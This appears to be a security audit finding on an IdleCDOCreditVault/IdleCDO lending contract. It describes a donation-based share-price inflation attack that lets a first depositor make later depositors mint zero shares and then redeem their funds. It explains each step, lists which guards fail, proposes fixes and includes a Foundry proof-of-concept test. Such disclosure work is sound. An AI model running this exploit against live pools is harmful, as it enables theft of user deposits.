### Title
Inflated tranche price via direct `token`/`strategyToken` donation causes `_mintSharesAtCurrPrice` to round minted shares down to 0 while NAV is still credited - ([File: contracts/IdleCDOCreditVault.sol])

### Summary
The external report concerns a fixed-point division (`amount * 1e18 / divisor`) that silently returns 0 when the divisor is inflated. The exact same structure exists in `_mintSharesAtCurrPrice`: `_minted = _amount * ONE_TRANCHE_TOKEN / _tranchePrice(_tranche)` in `contracts/IdleCDOCreditVault.sol:344-347` (and identically `contracts/IdleCDO.sol:437-440`). `_tranchePrice` is `lastTrancheNAV * ONE_TRANCHE_TOKEN / trancheSupply` (`_virtualPriceAux`, `IdleCDOCreditVault.sol:336`), and NAV is driven by `getContractValue()`, which counts the contract's raw `token` balance plus `strategyToken` balance minus `unclaimedFees` (`IdleCDOCreditVault.sol:125-128`). `_skimDonatedAssets` is only invoked in `IdleCDOEpochVariant._deposit` (`IdleCDOEpochVariant.sol:646-649`); the plain `IdleCDOCreditVault._deposit` (line 191) and `IdleCDO._deposit` (line 234) never skim raw-token donations, and `strategyToken` donations are never skimmed anywhere. A KYC-passing lender can therefore be the first depositor, inflate the tranche price with a donation, and cause subsequent victims to mint 0 shares while their deposit is fully credited to `lastNAVAA`/`lastNAVBB` in `_mintShares`.

### Finding Description
Attack sequence on an `IdleCDOCreditVault` (or `IdleCDO`) pool in buffer phase, non-AYS, KYC-whitelisted attacker:

1. Attacker calls `depositAA(1 wei)` → minted `1 * 1e18 / oneToken = 1` share wei; `lastNAVAA = 1`. Attacker now holds the entire AA supply.
2. Attacker `transfer`s a large amount of `token` directly to the CDO (or acquires and transfers `strategyToken`). Nothing in `IdleCDOCreditVault._deposit` calls `_skimDonatedAssets`, and `getContractValue()` counts both balances, so on the next interaction `_updateAccounting` records `totalGain ≈ donation`, splits it (all to AA if BB supply is 0, per `_virtualPriceAux` line 321-322), and `lastNAVAA` becomes `≈ donation`, with AA price ≈ `donation * 1e18 / 1`.
3. Victim calls `depositAA(A)`. `_updateAccounting` runs, then `_mintSharesAtCurrPrice` computes `_minted = A * 1e18 / price ≈ A / donation`, which floors to 0 whenever `donation > A`. `_mintShares` still executes `IdleCDOTranche.mint(victim, 0)` (no zero-share check) and `lastNAVAA += A` (line 359).
4. Attacker calls `withdrawAA(1)`. His single share is 100% of supply, so at the recomputed price he redeems `≈ donation + A` (minus performance fee on the fake "gain").

The depositor's funds are absorbed into the attacker-controlled NAV while the victim holds a worthless zero balance — the same "division by an excessive value yields 0 shares but accounting proceeds" breakage as the `DecimalMath.divFloor` report.

### Impact Explanation
Direct theft of user deposits. Every victim depositing less than the donated amount receives 0 tranche tokens while their underlying is booked into tranche NAV and is redeemable by the attacker's dust supply. Loss is bounded only by the donation size; an attacker donating `X` steals every subsequent deposit `< X`, recovering `X + Σdeposits - fee` — profitable whenever stolen deposits exceed the fee cut on the artificial gain. The fair-mint invariant (`shares ∝ deposited value`) and the donation-isolation invariant are broken.

### Likelihood Explanation
Requires an un-initialized tranche (supply 0) — true for every freshly deployed pool and for any tranche class (typically BB) that no one has entered yet. The attacker needs KYC (`isWalletAllowed`), which is permitted for this analysis, and capital for a donation slightly above the victim's deposit. Guards that do not stop it: `_checkDefault` (strategy price unchanged by a transfer), `_guarded` (donation bypasses the deposit-limit check), `_updateCallerBlock`/`_checkSameBlock` (irrelevant across blocks), `_skimDonatedAssets` (absent from `IdleCDOCreditVault._deposit`/`IdleCDO._deposit`, and never covers `strategyToken`), and the `_trancheTotSupply == 0` guard exists only in `depositDuringEpoch` (`IdleCDOEpochVariant.sol:677`), not in the primary `_deposit` path. Note residual uncertainty I could not fully verify in remaining iterations: `IdleCDOTranche.mint` is assumed not to revert on `amount == 0` (standard OZ ERC20 mints zero fine), and withdrawal liquidity for credit vaults depends on the borrower returning funds, so realization may need epoch-end/buffer timing.

### Recommendation
- Revert when `_minted == 0` in `_mintSharesAtCurrPrice`, or enforce a minimum first deposit.
- Seed both tranches with dead shares / minimum NAV at initialization (mirroring the `depositDuringEpoch` `_trancheTotSupply == 0` guard rationale).
- In `getContractValue`, exclude unsolicited `token` balances (track deposited principal internally) and extend `_skimDonatedAssets` coverage to `strategyToken`, or route donations to `unclaimedFees` instead of tranche NAV.

### Proof of Concept
```solidity
// Foundry fork test against an IdleCDOCreditVault instance (USDC, 6 dec).
// Attacker is KYC-whitelisted; pool in buffer phase, AA tranche empty.
function testDonationInflationStealsDeposit() external {
    uint256 DUST = 1;
    uint256 DONATION = 2_000_000e6;      // > victim deposit
    uint256 VICTIM = 1_000_000e6;

    // 1) attacker becomes sole AA holder
    deal(USDC, attacker, DUST + DONATION);
    vm.startPrank(attacker);
    IERC20(USDC).approve(address(cdo), type(uint256).max);
    cdo.depositAA(DUST);                 // mints ~1 wei of tranche tokens
    vm.stopPrank();
    assertEq(AAtranche.totalSupply(), IERC20(AAtranche).balanceOf(attacker));

    // 2) inflate AA price via raw donation (no skim in IdleCDOCreditVault._deposit)
    vm.prank(attacker);
    IERC20(USDC).transfer(address(cdo), DONATION);

    // 3) victim deposit mints 0 shares but NAV is credited
    deal(USDC, victim, VICTIM);
    vm.startPrank(victim);
    IERC20(USDC).approve(address(cdo), VICTIM);
    uint256 minted = cdo.depositAA(VICTIM);
    vm.stopPrank();
    assertEq(minted, 0);                              // amount*1e18/price rounds to 0
    assertEq(cdo.lastNAVAA(), DUST + DONATION + VICTIM);

    // 4) attacker redeems dust supply for the full NAV
    vm.prank(attacker);
    uint256 out = cdo.withdrawAA(IERC20(AAtranche).balanceOf(attacker));
    assertGt(out, DONATION);                          // steals VICTIM minus fee
}
```